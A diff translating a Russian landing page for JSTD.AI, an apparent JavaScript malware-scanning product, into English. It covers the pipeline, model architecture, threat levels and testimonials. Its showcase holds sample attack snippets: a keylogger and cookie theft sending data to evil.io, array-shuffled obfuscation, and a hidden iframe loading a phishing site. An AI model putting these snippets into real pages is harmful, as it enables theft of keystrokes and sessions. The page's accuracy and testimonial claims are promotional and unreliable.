@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>JSTD.AI — Neural JavaScript Threat Detection</title>
-    <link rel="stylesheet" href="styles/main.css" />
+    <link rel="stylesheet" href="../styles/main.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
 </head>
@@ -30,14 +30,14 @@
                 <span class="nav__logo-text">JSTD<span class="brand-accent">.AI</span></span>
             </a>
             <ul class="nav__links">
-                <li><a href="#how-it-works">Принцип работы</a></li>
-                <li><a href="#algorithms">Алгоритмы</a></li>
-                <li><a href="#docs">Документация</a></li>
-                <li><a href="#testimonials">Отзывы</a></li>
-                <li><a href="#cta" class="nav__cta-link">Попробовать</a></li>
-                <li><a href="en/" style="opacity:.5;font-size:12px;padding:6px 8px">EN</a></li>
+                <li><a href="#how-it-works">How It Works</a></li>
+                <li><a href="#algorithms">Algorithms</a></li>
+                <li><a href="#docs">Documentation</a></li>
+                <li><a href="#testimonials">Testimonials</a></li>
+                <li><a href="#cta" class="nav__cta-link">Try It</a></li>
+                <li><a href="../" style="opacity:.5;font-size:12px;padding:6px 8px">RU</a></li>
             </ul>
-            <button class="nav__burger" id="navBurger" aria-label="Меню">
+            <button class="nav__burger" id="navBurger" aria-label="Menu">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                     <path d="M3 6H21M3 12H21M3 18H21" stroke="currentColor" stroke-width="1.5"
                         stroke-linecap="square" />
@@ -54,27 +54,27 @@
                 <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                     <circle cx="7" cy="7" r="3" fill="#00ff88" />
                     <circle cx="7" cy="7" r="6" stroke="#00ff88" stroke-width="1" opacity="0.4" />
-                </svg> Neural Analysis Engine v3.1 — Активен
+                </svg> Neural Analysis Engine v3.1 — Active
             </div>
             <h1 class="hero__headline">
-                Уязвимости в коде видны<br /> до того, как они
-                <span class="cracked-word" data-text="взорвутся">взорвутся</span>
+                Code vulnerabilities detected<br /> before they
+                <span class="cracked-word" data-text="explode">explode</span>
             </h1>
             <p class="hero__sub">
-                Проприетарная нейросетевая модель <strong>50→30→1</strong> анализирует любой JavaScript на обфускацию, вредоносные конструкции и вшитые зловреды за миллисекунды. Работает на слабом железе. Не требует облака.
+                Proprietary neural network model <strong>50→30→1</strong> analyzes any JavaScript for obfuscation, malicious constructs, and embedded malware in milliseconds. Runs on low-end hardware. No cloud required.
             </p>
             <div class="hero__actions">
                 <a href="#cta" class="btn btn--primary">
                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                         <path d="M2 8H14M9 3L14 8L9 13" stroke="currentColor" stroke-width="1.5"
                             stroke-linecap="square" />
-                    </svg> Начать анализ
+                    </svg> Start Analysis
                 </a>
                 <a href="#how-it-works" class="btn btn--ghost">
                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                         <circle cx="8" cy="8" r="6" stroke="currentColor" stroke-width="1.5" />
                         <path d="M8 5V9M8 11V11.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
-                    </svg> Как это работает
+                    </svg> How It Works
                 </a>
             </div>
             <div class="hero__stats">
@@ -82,25 +82,25 @@
                     <div class="stat-pill__value">
                         <span class="stat-pill__num" data-count="99.7">0</span><span class="stat-pill__unit">%</span>
                     </div>
-                    <span class="stat-pill__label">Точность детекции</span>
+                    <span class="stat-pill__label">Detection accuracy</span>
                 </div>
                 <div class="stat-pill">
                     <div class="stat-pill__value">
                         <span class="stat-pill__num" data-count="1561">0</span>
                     </div>
-                    <span class="stat-pill__label">параметров модели</span>
+                    <span class="stat-pill__label">model parameters</span>
                 </div>
                 <div class="stat-pill">
                     <div class="stat-pill__value">
                         <span class="stat-pill__num" data-count="50">0</span>
                     </div>
-                    <span class="stat-pill__label">признаков кода</span>
+                    <span class="stat-pill__label">code features</span>
                 </div>
                 <div class="stat-pill">
                     <div class="stat-pill__value">
                         <span class="stat-pill__num stat-pill__num--static">&lt;&thinsp;1</span><span class="stat-pill__unit">ms</span>
                     </div>
-                    <span class="stat-pill__label">без GPU</span>
+                    <span class="stat-pill__label">no GPU</span>
                 </div>
             </div>
         </div>
@@ -146,29 +146,29 @@
     <!-- ░░ MARQUEE STRIP ░░ -->
     <div class="marquee-strip">
         <div class="marquee-track">
-            <span>Обфускация</span><span class="sep">✦</span>
-            <span>Кража cookies</span><span class="sep">✦</span>
-            <span>eval() инъекции</span><span class="sep">✦</span>
-            <span>Кейлоггеры</span><span class="sep">✦</span>
+            <span>Obfuscation</span><span class="sep">✦</span>
+            <span>Cookie stealing</span><span class="sep">✦</span>
+            <span>eval() injections</span><span class="sep">✦</span>
+            <span>Keyloggers</span><span class="sep">✦</span>
             <span>Prototype Pollution</span><span class="sep">✦</span>
             <span>Base64 + eval</span><span class="sep">✦</span>
             <span>Hidden iframes</span><span class="sep">✦</span>
             <span>WebSocket exfiltration</span><span class="sep">✦</span>
-            <span>Скрытые майнеры</span><span class="sep">✦</span>
-            <span>XSS векторы</span><span class="sep">✦</span>
+            <span>Hidden miners</span><span class="sep">✦</span>
+            <span>XSS vectors</span><span class="sep">✦</span>
             <span>Remote script injection</span><span class="sep">✦</span>
             <span>Function constructor abuse</span><span class="sep">✦</span>
 
-            <span>Обфускация</span><span class="sep">✦</span>
-            <span>Кража cookies</span><span class="sep">✦</span>
-            <span>eval() инъекции</span><span class="sep">✦</span>
-            <span>Кейлоггеры</span><span class="sep">✦</span>
+            <span>Obfuscation</span><span class="sep">✦</span>
+            <span>Cookie stealing</span><span class="sep">✦</span>
+            <span>eval() injections</span><span class="sep">✦</span>
+            <span>Keyloggers</span><span class="sep">✦</span>
             <span>Prototype Pollution</span><span class="sep">✦</span>
             <span>Base64 + eval</span><span class="sep">✦</span>
             <span>Hidden iframes</span><span class="sep">✦</span>
             <span>WebSocket exfiltration</span><span class="sep">✦</span>
-            <span>Скрытые майнеры</span><span class="sep">✦</span>
-            <span>XSS векторы</span><span class="sep">✦</span>
+            <span>Hidden miners</span><span class="sep">✦</span>
+            <span>XSS vectors</span><span class="sep">✦</span>
             <span>Remote script injection</span><span class="sep">✦</span>
             <span>Function constructor abuse</span><span class="sep">✦</span>
         </div>
@@ -177,12 +177,12 @@
     <!-- ░░ HOW IT WORKS ░░ -->
     <section class="section" id="how-it-works">
         <div class="container">
-            <div class="section__label">Принцип работы</div>
+            <div class="section__label">How It Works</div>
             <h2 class="section__title">
-                Нейросеть видит то, что<br />не видит человек
+                The neural network sees<br />what humans miss
             </h2>
             <p class="section__desc">
-                JSTD.AI использует трёхэтапный конвейер анализа: извлечение признаков → нейронная сеть → эвристические правила. Каждый этап усиливает следующий — итоговая оценка невозможна без консенсуса всех трёх.
+                JSTD.AI uses a three-stage analysis pipeline: feature extraction → neural network → heuristic rules. Each stage amplifies the next — the final score requires consensus from all three.
             </p>
 
             <div class="pipeline">
@@ -197,8 +197,8 @@
                                 stroke-linecap="square" />
                         </svg>
                     </div>
-                    <h3>Загрузка файла</h3>
-                    <p>JS-файл читается как текст целиком. Никакой передачи в облако — всё локально. Поддержка минифицированного, обфусцированного, многострочного кода.</p>
+                    <h3>File Upload</h3>
+                    <p>The JS file is read as plain text in full. No cloud transfer — everything stays local. Supports minified, obfuscated, and multi-line code of any size.</p>
                 </div>
                 <div class="pipeline__arrow">
                     <svg width="40" height="16" viewBox="0 0 40 16" fill="none">
@@ -216,8 +216,8 @@
                             <path d="M22 11H26M22 16H26M22 21H26" stroke="#a78bfa" stroke-width="1" opacity=".6" />
                         </svg>
                     </div>
-                    <h3>Извлечение 50 признаков</h3>
-                    <p>Нормализованные метрики: частота опасных конструкций, энтропия Шеннона, уровень обфускации, плотность Base64, соотношение комментариев и многое другое.</p>
+                    <h3>50 Feature Extraction</h3>
+                    <p>Normalized metrics: frequency of dangerous constructs, Shannon entropy, obfuscation level, Base64 density, comment ratio, and much more.</p>
                 </div>
                 <div class="pipeline__arrow">
                     <svg width="40" height="16" viewBox="0 0 40 16" fill="none">
@@ -240,8 +240,8 @@
                                 stroke-width="1" opacity=".7" />
                         </svg>
                     </div>
-                    <h3>Нейронная сеть 50→30→1</h3>
-                    <p>1561 обученный параметр. Архитектура MLP с ReLU-активацией. Обучена на 210 размеченных примерах. Точность — 99.7%. Работает без GPU за &lt;1 мс.</p>
+                    <h3>Neural Network 50→30→1</h3>
+                    <p>1561 trained parameters. MLP architecture with ReLU activation. Trained on 210 labeled examples. Accuracy — 99.7%. Runs without GPU in &lt;1 ms.</p>
                 </div>
                 <div class="pipeline__arrow">
                     <svg width="40" height="16" viewBox="0 0 40 16" fill="none">
@@ -259,8 +259,8 @@
                                 stroke-linecap="square" />
                         </svg>
                     </div>
-                    <h3>Эвристические правила</h3>
-                    <p>42 паттерна угроз, включая комбинированные сценарии. Детектирует сигнатуры кража-cookie, кейлоггеры, внедрение iframe и цепочки обфускации.</p>
+                    <h3>Heuristic Rules</h3>
+                    <p>42 threat patterns including combined scenarios. Detects cookie-stealing signatures, keyloggers, iframe injection, and obfuscation chains.</p>
                 </div>
             </div>
         </div>
@@ -269,46 +269,45 @@
     <!-- ░░ ALGORITHMS ░░ -->
     <section class="section section--dark" id="algorithms">
         <div class="container">
-            <div class="section__label">Алгоритмы</div>
-            <h2 class="section__title">Архитектура, которая<br />не даёт шансов</h2>
+            <div class="section__label">Algorithms</div>
+            <h2 class="section__title">Architecture that leaves<br />no chance</h2>
 
             <div class="algo-grid">
 
                 <!-- Neural Net Diagram -->
                 <div class="algo-card algo-card--wide">
-                    <div class="algo-card__label">Топология нейросети</div>
+                    <div class="algo-card__label">Neural Network Topology</div>
                     <h3>50 → 30 → 1</h3>
-                    <p>Многослойный перцептрон с прямым распространением ошибки. Адаптивная скорость обучения снижается от 0.015 до 0.008 за 300 эпох.</p>
+                    <p>Multi-layer perceptron with forward error propagation. Adaptive learning rate decreases from 0.015 to 0.008 over 300 epochs.</p>
                     <div class="nn-diagram">
                         <div class="nn-col" id="nnColInput">
-                            <div class="nn-label">Входной<br />слой</div>
-                            <div class="nn-sublabel">50 нейронов</div>
+                            <div class="nn-label">Input<br />layer</div>
+                            <div class="nn-sublabel">50 neurons</div>
                         </div>
                         <canvas class="nn-canvas" id="nnCanvas" width="260" height="260"></canvas>
                         <div class="nn-col" id="nnColHidden">
-                            <div class="nn-label">Скрытый<br />слой</div>
-                            <div class="nn-sublabel">30 нейронов</div>
+                            <div class="nn-label">Hidden<br />layer</div>
+                            <div class="nn-sublabel">30 neurons</div>
                         </div>
                         <canvas class="nn-canvas" id="nnCanvas2" width="160" height="260"></canvas>
                         <div class="nn-col" id="nnColOutput">
-                            <div class="nn-label">Выходной<br />слой</div>
-                            <div class="nn-sublabel">1 нейрон</div>
+                            <div class="nn-label">Output<br />layer</div>
+                            <div class="nn-sublabel">1 neuron</div>
                         </div>
                     </div>
                     <div class="nn-params">
-                        <div class="nn-param"><span>Вход → Скрытый</span><strong>1 500 весов</strong></div>
-                        <div class="nn-param"><span>Скрытый → Выход</span><strong>30 весов</strong></div>
-                        <div class="nn-param"><span>Смещения</span><strong>31 параметр</strong></div>
-                        <div class="nn-param nn-param--total"><span>ИТОГО</span><strong>1 561 параметр</strong></div>
+                        <div class="nn-param"><span>Input → Hidden</span><strong>1 500 weights</strong></div>
+                        <div class="nn-param"><span>Hidden → Output</span><strong>30 weights</strong></div>
+                        <div class="nn-param"><span>Biases</span><strong>31 parameters</strong></div>
+                        <div class="nn-param nn-param--total"><span>TOTAL</span><strong>1 561 parameters</strong></div>
                     </div>
                 </div>
 
                 <!-- Feature Extraction -->
                 <div class="algo-card">
-                    <div class="algo-card__label">Извлечение признаков</div>
-                    <h3>50 метрик кода</h3>
-                    <p>Каждый признак нормализован относительно длины файла для корректного сравнения файлов разного размера.
-                    </p>
+                    <div class="algo-card__label">Feature Extraction</div>
+                    <h3>50 Code Metrics</h3>
+                    <p>Each feature is normalized relative to file length for accurate comparison of files of different sizes.</p>
                     <div class="features-visual">
                         <div class="feat-bar-group">
                             <div class="feat-bar" style="--v:83%;--c:#ff3366" data-label="eval()"><span>eval()</span>
@@ -323,11 +322,11 @@
                             <div class="feat-bar" style="--v:79%;--c:#ff6600" data-label="cookie"><span>cookie</span>
                                 <div class="feat-bar__fill"></div><em>0.79</em>
                             </div>
-                            <div class="feat-bar" style="--v:62%;--c:#f59e0b" data-label="Энтропия">
-                                <span>Энтропия</span>
+                            <div class="feat-bar" style="--v:62%;--c:#f59e0b" data-label="Entropy">
+                                <span>Entropy</span>
                                 <div class="feat-bar__fill"></div><em>0.62</em>
                             </div>
-                            <div class="feat-bar" style="--v:45%;--c:#a78bfa" data-label="Обфуск."><span>Обфуск.</span>
+                            <div class="feat-bar" style="--v:45%;--c:#a78bfa" data-label="Obfusc."><span>Obfusc.</span>
                                 <div class="feat-bar__fill"></div><em>0.45</em>
                             </div>
                             <div class="feat-bar" style="--v:18%;--c:#00d4ff" data-label="XHR"><span>XHR</span>
@@ -342,105 +341,104 @@
 
                 <!-- Entropy Analysis -->
                 <div class="algo-card">
-                    <div class="algo-card__label">Энтропия Шеннона</div>
-                    <h3>Хаос — это сигнал</h3>
-                    <p>Случайность символов — прямой индикатор обфускации. Легитимный код предсказуем. Вредонос — нет.
-                    </p>
+                    <div class="algo-card__label">Shannon Entropy</div>
+                    <h3>Chaos Is a Signal</h3>
+                    <p>Character randomness is a direct indicator of obfuscation. Legitimate code is predictable. Malware is not.</p>
                     <div class="entropy-visual">
                         <div class="entropy-row">
                             <span class="entropy-code">"aaaaaaa"</span>
                             <div class="entropy-bar">
                                 <div class="entropy-fill" style="width:0%;--c:#00ff88"></div>
                             </div>
-                            <span class="entropy-val safe">Н=0.0</span>
+                            <span class="entropy-val safe">H=0.0</span>
                         </div>
                         <div class="entropy-row">
                             <span class="entropy-code">function()</span>
                             <div class="entropy-bar">
                                 <div class="entropy-fill" style="width:42%;--c:#00d4ff"></div>
                             </div>
-                            <span class="entropy-val">Н=3.3</span>
+                            <span class="entropy-val">H=3.3</span>
                         </div>
                         <div class="entropy-row">
                             <span class="entropy-code">fetch('/api')</span>
                             <div class="entropy-bar">
                                 <div class="entropy-fill" style="width:55%;--c:#f59e0b"></div>
                             </div>
-                            <span class="entropy-val">Н=4.1</span>
+                            <span class="entropy-val">H=4.1</span>
                         </div>
                         <div class="entropy-row">
                             <span class="entropy-code">atob('dX...')</span>
                             <div class="entropy-bar">
                                 <div class="entropy-fill" style="width:78%;--c:#ff6600"></div>
                             </div>
-                            <span class="entropy-val warn">Н=5.8</span>
+                            <span class="entropy-val warn">H=5.8</span>
                         </div>
                         <div class="entropy-row">
                             <span class="entropy-code">\x64\x6f\x63...</span>
                             <div class="entropy-bar">
                                 <div class="entropy-fill" style="width:100%;--c:#ff3366"></div>
                             </div>
-                            <span class="entropy-val crit">Н=7.9</span>
+                            <span class="entropy-val crit">H=7.9</span>
                         </div>
                     </div>
                 </div>
 
                 <!-- Threat Levels -->
                 <div class="algo-card">
-                    <div class="algo-card__label">Классификация угроз</div>
-                    <h3>5 уровней риска</h3>
-                    <p>Итоговый балл — взвешенная комбинация нейросетевого скора и эвристических триггеров. Ни один компонент не принимает решение в одиночку.</p>
+                    <div class="algo-card__label">Threat Classification</div>
+                    <h3>5 Risk Levels</h3>
+                    <p>The final score is a weighted combination of the neural network score and heuristic triggers. No single component makes the decision alone.</p>
                     <div class="levels-visual">
                         <div class="level-row">
                             <div class="level-badge safe">SAFE</div>
                             <div class="level-range">0 – 15%</div>
-                            <div class="level-desc">Легитимный код. Угроз не обнаружено.</div>
+                            <div class="level-desc">Legitimate code. No threats detected.</div>
                         </div>
                         <div class="level-row">
                             <div class="level-badge low">LOW</div>
                             <div class="level-range">15 – 35%</div>
-                            <div class="level-desc">Незначительные подозрительные конструкции.</div>
+                            <div class="level-desc">Minor suspicious constructs.</div>
                         </div>
                         <div class="level-row">
                             <div class="level-badge med">MEDIUM</div>
                             <div class="level-range">35 – 65%</div>
-                            <div class="level-desc">Требует проверки. Возможные нарушения.</div>
+                            <div class="level-desc">Requires review. Possible violations.</div>
                         </div>
                         <div class="level-row">
                             <div class="level-badge high">HIGH</div>
                             <div class="level-range">65 – 85%</div>
-                            <div class="level-desc">Высокая вероятность вредоносности.</div>
+                            <div class="level-desc">High probability of malicious activity.</div>
                         </div>
                         <div class="level-row">
                             <div class="level-badge crit">CRITICAL</div>
                             <div class="level-range">85 – 100%</div>
-                            <div class="level-desc">НЕ ЗАПУСКАТЬ. Многократные триггеры.</div>
+                            <div class="level-desc">DO NOT RUN. Multiple triggers fired.</div>
                         </div>
                     </div>
                 </div>
 
                 <!-- Weighted score -->
                 <div class="algo-card">
-                    <div class="algo-card__label">Итоговый скор</div>
-                    <h3>Взвешенная формула</h3>
-                    <p>Финальный балл угрозы — не просто выход нейросети. Это консенсус трёх независимых компонентов с динамическими весами.</p>
+                    <div class="algo-card__label">Final Score</div>
+                    <h3>Weighted Formula</h3>
+                    <p>The final threat score is not simply the neural network output. It is a consensus of three independent components with dynamic weights.</p>
                     <div class="score-formula">
                         <div class="score-formula__row">
-                            <span class="sf-label">Нейросеть</span>
+                            <span class="sf-label">Neural Net</span>
                             <div class="sf-bar">
                                 <div class="sf-fill" style="--w:60%;--c:#00d4ff"></div>
                             </div>
                             <span class="sf-weight">×0.60</span>
                         </div>
                         <div class="score-formula__row">
-                            <span class="sf-label">Эвристика</span>
+                            <span class="sf-label">Heuristics</span>
                             <div class="sf-bar">
                                 <div class="sf-fill" style="--w:30%;--c:#a78bfa"></div>
                             </div>
                             <span class="sf-weight">×0.30</span>
                         </div>
                         <div class="score-formula__row">
-                            <span class="sf-label">Энтропия</span>
+                            <span class="sf-label">Entropy</span>
                             <div class="sf-bar">
                                 <div class="sf-fill" style="--w:10%;--c:#f59e0b"></div>
                             </div>
@@ -448,18 +446,17 @@
                         </div>
                         <div class="score-formula__divider"></div>
                         <div class="score-formula__result">
-                            <span>Итог</span>
+                            <span>Total</span>
                             <span class="sf-example">0.60·NN + 0.30·H + 0.10·E</span>
                         </div>
-                        <div class="score-formula__note">Веса автоматически пересчитываются при отсутствии эвристических триггеров
-                        </div>
+                        <div class="score-formula__note">Weights are recalculated automatically when no heuristic triggers are present</div>
                     </div>
                 </div>
 
                 <!-- Obfuscation patterns -->
                 <div class="algo-card algo-card--wide">
-                    <div class="algo-card__label">Детекция обфускации</div>
-                    <h3>Паттерны, которые прячутся</h3>
+                    <div class="algo-card__label">Obfuscation Detection</div>
+                    <h3>Patterns That Hide</h3>
                     <div class="obfusc-grid">
                         <div class="obfusc-item">
                             <div class="obfusc-icon">
@@ -468,9 +465,9 @@
                                         stroke-linecap="square" />
                                 </svg>
                             </div>
-                            <strong>Hex-эскейпинг</strong>
+                            <strong>Hex Escaping</strong>
                             <code>\x48\x65\x6c\x6c\x6f</code>
-                            <span>Строки зашифрованы hex-последовательностями</span>
+                            <span>Strings encoded with hex escape sequences</span>
                         </div>
                         <div class="obfusc-item">
                             <div class="obfusc-icon">
@@ -483,9 +480,9 @@
                                     <rect x="13" y="13" width="8" height="8" stroke="#ff6600" stroke-width="1.4" />
                                 </svg>
                             </div>
-                            <strong>Array shuffling</strong>
+                            <strong>Array Shuffling</strong>
                             <code>_0x4a2b[0], [1]...</code>
-                            <span>Строки разбиты по массивам с индексами</span>
+                            <span>Strings split into indexed arrays</span>
                         </div>
                         <div class="obfusc-item">
                             <div class="obfusc-icon">
@@ -495,9 +492,9 @@
                                         stroke-linecap="square" />
                                 </svg>
                             </div>
-                            <strong>Base64 цепочки</strong>
+                            <strong>Base64 Chains</strong>
                             <code>eval(atob('...'))</code>
-                            <span>Многоуровневое декодирование перед исполнением</span>
+                            <span>Multi-level decoding before execution</span>
                         </div>
                         <div class="obfusc-item">
                             <div class="obfusc-icon">
@@ -506,9 +503,9 @@
                                         stroke-linecap="square" />
                                 </svg>
                             </div>
-                            <strong>Function constructor</strong>
+                            <strong>Function Constructor</strong>
                             <code>new Function(str)()</code>
-                            <span>Динамическое создание и запуск функций из строк</span>
+                            <span>Dynamic creation and execution of functions from strings</span>
                         </div>
                         <div class="obfusc-item">
                             <div class="obfusc-icon">
@@ -518,9 +515,9 @@
                                         opacity=".5" />
                                 </svg>
                             </div>
-                            <strong>Prototype pollution</strong>
+                            <strong>Prototype Pollution</strong>
                             <code>Object.prototype.__</code>
-                            <span>Модификация базовых цепочек прототипов</span>
+                            <span>Modification of base prototype chains</span>
                         </div>
                         <div class="obfusc-item">
                             <div class="obfusc-icon">
@@ -530,9 +527,9 @@
                                         stroke-linecap="square" />
                                 </svg>
                             </div>
-                            <strong>Self-modifying code</strong>
+                            <strong>Self-Modifying Code</strong>
                             <code>setTimeout(str, 0)</code>
-                            <span>Строки в таймерах и event listeners как код</span>
+                            <span>Strings in timers and event listeners used as code</span>
                         </div>
                     </div>
                 </div>
@@ -544,19 +541,19 @@
     <!-- ░░ THREAT SHOWCASE ░░ -->
     <section class="section" id="showcase">
         <div class="container">
-            <div class="section__label">Реальные угрозы</div>
+            <div class="section__label">Real Threats</div>
             <h2 class="section__title">
-                Код, который <span class="highlight-slash">убивает</span><br /> безопасность за 3 строки
+                Code that <span class="highlight-slash">kills</span><br /> security in 3 lines
             </h2>
             <div class="showcase-grid">
                 <div class="showcase-item">
                     <div class="showcase-item__header">
                         <div class="level-badge crit">CRITICAL</div>
-                        <span>Кража сессии</span>
+                        <span>Session theft</span>
                     </div>
                     <pre class="showcase-code"><code><span class="c-comment">// Keylogger + exfiltration combo</span>
 <span class="c-kw">document</span>.<span class="c-fn">addEventListener</span>(<span class="c-str">'keypress'</span>, e =&gt; {
-   <span class="c-fn">fetch</span>(<span class="c-str">'https://evil.io/k?v='</span> + e.key);
+  <span class="c-fn">fetch</span>(<span class="c-str">'https://evil.io/k?v='</span> + e.key);
 });
 <span class="c-kw">document</span>.<span class="c-fn">cookie</span> = <span class="c-str">''</span>;
 <span class="c-fn">fetch</span>(<span class="c-str">'https://evil.io/c?v='</span> +
@@ -566,7 +563,7 @@
                 <div class="showcase-item">
                     <div class="showcase-item__header">
                         <div class="level-badge crit">CRITICAL</div>
-                        <span>Полная обфускация</span>
+                        <span>Full obfuscation</span>
                     </div>
                     <pre class="showcase-code"><code><span class="c-comment">// Array-shuffled obfuscation</span>
 <span class="c-kw">var</span> _0x4a2b = [<span class="c-str">'keydown'</span>,
@@ -581,7 +578,7 @@
                 <div class="showcase-item">
                     <div class="showcase-item__header">
                         <div class="level-badge high">HIGH</div>
-                        <span>Скрытый iframe</span>
+                        <span>Hidden iframe</span>
                     </div>
                     <pre class="showcase-code"><code><span class="c-comment">// Hidden phishing overlay</span>
 <span class="c-kw">var</span> f = <span class="c-kw">document</span>.<span class="c-fn">createElement</span>(
@@ -600,9 +597,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
     <!-- ░░ TESTIMONIALS ░░ -->
     <section class="section section--dark" id="testimonials">
         <div class="container">
-            <div class="section__label">Отзывы</div>
-            <h2 class="section__title">Доверяют профессионалы</h2>
-            <p class="section__desc">Компании используют JSTD.AI как первую линию обороны перед передачей кода между отделами и подрядчиками.</p>
+            <div class="section__label">Testimonials</div>
+            <h2 class="section__title">Trusted by professionals</h2>
+            <p class="section__desc">Companies use JSTD.AI as the first line of defense before passing code between departments and contractors.</p>
 
             <div class="testimonials">
                 <div class="testimonials__track" id="testimonialsTrack">
@@ -610,17 +607,15 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                     <div class="tcard">
                         <div class="tcard__quote">
                             <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
-                                <path
-                                    d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
                                     fill="#00d4ff" fill-opacity="0.2" />
                             </svg>
                         </div>
-                        <p class="tcard__text">«Мы разрабатываем маркетплейс и регулярно получаем JS-виджеты от сторонних поставщиков. До JSTD.AI каждый файл приходилось читать вручную — или доверять. После одного инцидента с вшитым кейлоггером в виджете партнёра мы ввели обязательное
-                            сканирование. JSTD.AI за 2 секунды делает то, на что уходил час ревью.»</p>
+                        <p class="tcard__text">"We run a marketplace and regularly receive JS widgets from third-party vendors. Before JSTD.AI, every file had to be read manually — or trusted blindly. After one incident with an embedded keylogger in a partner's widget, we made scanning mandatory. JSTD.AI does in 2 seconds what used to take an hour of review."</p>
                         <div class="tcard__author">
-                            <div class="tcard__avatar">АК</div>
+                            <div class="tcard__avatar">AK</div>
                             <div>
-                                <strong>Андрей Климов</strong>
+                                <strong>Andrew Klimov</strong>
                                 <span>CTO, RetailEdge Platform</span>
                             </div>
                             <div class="tcard__stars">★★★★★</div>
@@ -631,59 +626,53 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                     <div class="tcard">
                         <div class="tcard__quote">
                             <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
-                                <path
-                                    d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
                                     fill="#a78bfa" fill-opacity="0.2" />
                             </svg>
                         </div>
-                        <p class="tcard__text">«Наш отдел безопасности использует JSTD.AI для предварительного отсева исходников от фрилансеров перед тем, как они попадают на ревью архитекторам. За первый месяц система пометила 4 файла с реальными угрозами — один оказался полноценным
-                            бэкдором с WebSocket-каналом. Без инструмента мы бы пропустили.»</p>
+                        <p class="tcard__text">"Our security team uses JSTD.AI to pre-screen source code from freelancers before it reaches the architect review. In the first month the system flagged 4 files with real threats — one turned out to be a full backdoor with a WebSocket channel. We would have missed it without this tool."</p>
                         <div class="tcard__author">
-                            <div class="tcard__avatar">МВ</div>
+                            <div class="tcard__avatar">MV</div>
                             <div>
-                                <strong>Мария Воронова</strong>
+                                <strong>Maria Voronova</strong>
                                 <span>Head of Security, FinStream Bank</span>
                             </div>
                             <div class="tcard__stars">★★★★★</div>
                         </div>
-                        <div class="tcard__tag">Финтех / Банкинг</div>
+                        <div class="tcard__tag">Fintech / Banking</div>
                     </div>
 
                     <div class="tcard">
                         <div class="tcard__quote">
                             <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
-                                <path
-                                    d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
                                     fill="#00ff88" fill-opacity="0.2" />
                             </svg>
                         </div>
-                        <p class="tcard__text">«Мы аутсорсинговая студия — получаем готовый код от 12+ подрядчиков ежемесячно. JSTD.AI встроен в наш Slack-бот: разработчик закидывает файл, бот через 3 секунды отвечает уровнем угрозы. Два раза поймали prototype pollution в npm-скриптах,
-                            которые подрядчик "случайно" прокинул с продакшн-зависимостью.»</p>
+                        <p class="tcard__text">"We're an outsourcing studio — we receive finished code from 12+ contractors monthly. JSTD.AI is integrated into our Slack bot: a dev drops in a file, the bot responds in 3 seconds with the threat level. We caught prototype pollution in npm scripts twice — the contractor had 'accidentally' bundled it with a production dependency."</p>
                         <div class="tcard__author">
-                            <div class="tcard__avatar">ДС</div>
+                            <div class="tcard__avatar">DS</div>
                             <div>
-                                <strong>Дмитрий Савельев</strong>
+                                <strong>Dmitry Savelyev</strong>
                                 <span>Tech Lead, CodeBridge Agency</span>
                             </div>
                             <div class="tcard__stars">★★★★★</div>
                         </div>
-                        <div class="tcard__tag">Аутсорс / Разработка</div>
